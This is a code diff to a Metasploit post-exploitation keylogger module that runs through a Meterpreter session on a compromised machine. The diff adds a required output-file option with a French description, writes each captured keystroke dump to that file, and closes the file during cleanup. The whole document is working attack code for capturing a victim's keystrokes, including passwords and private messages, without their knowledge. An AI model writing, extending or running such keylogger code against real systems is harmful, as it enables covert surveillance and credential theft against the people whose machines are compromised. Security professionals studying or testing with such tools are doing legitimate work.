@@ -16,6 +16,9 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => ['meterpreter']
       )
     )
+	register_options([
+		OptString.new('outputfile', [true, 'Fichier d\'enregistrement des touches'])
+	])
   end
 
   def run
@@ -40,6 +43,13 @@ class MetasploitModule < Msf::Post
     end
 
     print_status('Keylogger started...')
+	output_file = datastore['outputfile']
+	output_handle = nil
+	
+	if output_file.present?
+      print_status("Captured keystrokes will be saved to #{output_file}.")
+      output_handle = File.open(output_file, 'a')
+    end
 
     # Start the keyscan capture
     client.ui.keyscan_start
@@ -50,8 +60,9 @@ class MetasploitModule < Msf::Post
         captured_keys = client.ui.keyscan_dump
 
         # Print the captured keys
-        if captured_keys.present?
+        if captured_keys.present? then
           print_status("Captured keys: #{captured_keys}")
+		  output_handle.puts(captured_keys) if output_handle != nil
         else
           # Sleep for a short duration to avoid high CPU usage
           sleep(1)
@@ -62,15 +73,17 @@ class MetasploitModule < Msf::Post
     rescue Rex::RuntimeError => e
       print_error("Error occurred: #{e.message}")
     ensure
-      cleanup_and_exit
+      cleanup_and_exit(output_handle)
     end
   end
 
-  def cleanup_and_exit
+  def cleanup_and_exit(output_handle = nil)
     begin
       # Stop the keyscan capture
       client.ui.keyscan_stop
       print_status('Keylogger stopped.')
+	  
+	  output_handle.close() if output_handle && !output_handle.closed?
 
       # Retrieve the process list
       process_list = client.sys.process.get_processes
